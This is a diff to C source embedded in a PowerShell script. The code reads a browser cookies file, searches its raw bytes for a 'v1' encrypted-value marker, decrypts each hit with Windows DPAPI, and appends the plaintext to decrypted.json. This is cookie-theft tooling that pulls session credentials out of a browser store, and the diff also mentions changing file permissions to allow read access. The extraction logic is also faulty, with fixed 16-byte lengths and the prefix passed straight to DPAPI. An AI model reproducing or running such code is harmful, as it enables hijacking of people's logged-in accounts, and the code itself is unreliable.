@@ -19,6 +19,17 @@ $cProgram = @"
 #include <stdlib.h>
 #include <string.h>
 
+// Function to print data in hex format for debugging
+void print_hex(const BYTE *data, DWORD data_len) {
+    for (DWORD i = 0; i < data_len; i++) {
+        printf("%02x ", data[i]);
+        if ((i + 1) % 16 == 0) {
+            printf("\n");
+        }
+    }
+    printf("\n");
+}
+
 // Function to decrypt data using Windows DPAPI
 void decrypt_data(const BYTE *data, DWORD data_len, BYTE **decrypted_data, DWORD *decrypted_data_len) {
     DATA_BLOB encrypted_blob;
@@ -51,42 +62,51 @@ void read_cookies_file(const char *path) {
     fseek(file, 0, SEEK_SET);
 
     // Allocate buffer to hold the entire file content
-    BYTE *encrypted_data = (BYTE *)malloc(file_size);
-    if (!encrypted_data) {
+    BYTE *file_data = (BYTE *)malloc(file_size);
+    if (!file_data) {
         perror("Failed to allocate memory");
         fclose(file);
         return;
     }
 
     // Read the entire file content
-    DWORD encrypted_data_len = fread(encrypted_data, 1, file_size, file);
+    fread(file_data, 1, file_size, file);
     fclose(file);
 
-    printf("Read %lu bytes from file\n", encrypted_data_len);
+    printf("Read %ld bytes from file\n", file_size);
+    print_hex(file_data, file_size);
 
-    if (encrypted_data_len > 0) {
-        BYTE *decrypted_data = NULL;
-        DWORD decrypted_data_len = 0;
+    // Example: Extracting encrypted values from the binary data
+    // This is a simplified example and may need adjustments based on the actual file structure
+    for (long i = 0; i < file_size - 16; i++) {
+        if (file_data[i] == 0x76 && file_data[i + 1] == 0x31) { // Example pattern to identify encrypted data
+            BYTE *encrypted_value = &file_data[i];
+            DWORD encrypted_value_len = 16; // Example length of encrypted data
 
-        decrypt_data(encrypted_data, encrypted_data_len, &decrypted_data, &decrypted_data_len);
+            printf("Encrypted value (hex):\n");
+            print_hex(encrypted_value, encrypted_value_len);
 
-        if (decrypted_data) {
-            // Write decrypted data to JSON file
-            FILE *json_file = fopen("decrypted.json", "w");
-            if (json_file) {
-                fprintf(json_file, "{\n\t\"decrypted_data\": \"%.*s\"\n}\n", decrypted_data_len, decrypted_data);
-                fclose(json_file);
-                printf("Decrypted data written to decrypted.json\n");
-            } else {
-                perror("Failed to open JSON file");
+            BYTE *decrypted_data = NULL;
+            DWORD decrypted_data_len = 0;
+
+            decrypt_data(encrypted_value, encrypted_value_len, &decrypted_data, &decrypted_data_len);
+
+            if (decrypted_data) {
+                // Write decrypted data to JSON file
+                FILE *json_file = fopen("decrypted.json", "a");
+                if (json_file) {
+                    fprintf(json_file, "{\n\t\"decrypted_data\": \"%.*s\"\n}\n", decrypted_data_len, decrypted_data);
+                    fclose(json_file);
+                    printf("Decrypted data written to decrypted.json\n");
+                } else {
+                    perror("Failed to open JSON file");
+                }
+                free(decrypted_data);
             }
-            free(decrypted_data);
         }
-    } else {
-        printf("No data read from file\n");
     }
 
-    free(encrypted_data);
+    free(file_data);
 }
 
 // Function to set file permissions to allow read access
